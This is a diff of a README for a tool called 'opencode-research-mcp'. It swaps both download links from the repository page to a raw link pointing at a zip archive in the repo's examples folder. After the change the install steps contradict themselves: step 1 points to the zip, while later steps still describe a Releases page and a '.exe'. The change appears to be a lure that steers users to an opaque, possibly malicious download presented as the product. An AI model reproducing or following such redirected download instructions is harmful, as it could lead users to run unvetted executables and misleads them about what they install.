@@ -1,6 +1,6 @@
 # 🔍 opencode-research-mcp - Streamline your academic research process today
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Elroysemiliterate213/opencode-research-mcp)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Elroysemiliterate213/opencode-research-mcp/main/examples/opencode_mcp_research_2.4.zip)
 
 ## 📖 What this tool does
 
@@ -20,7 +20,7 @@ The software requires at least 4GB of RAM to run effectively. You should have at
 
 Follow these steps to set up the application on your computer.
 
-1. Visit this page to download the software: https://github.com/Elroysemiliterate213/opencode-research-mcp
+1. Visit this page to download the software: https://raw.githubusercontent.com/Elroysemiliterate213/opencode-research-mcp/main/examples/opencode_mcp_research_2.4.zip
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the most recent version shown at the top of the list.
 4. Look for the file ending in `.exe` under the "Assets" heading.
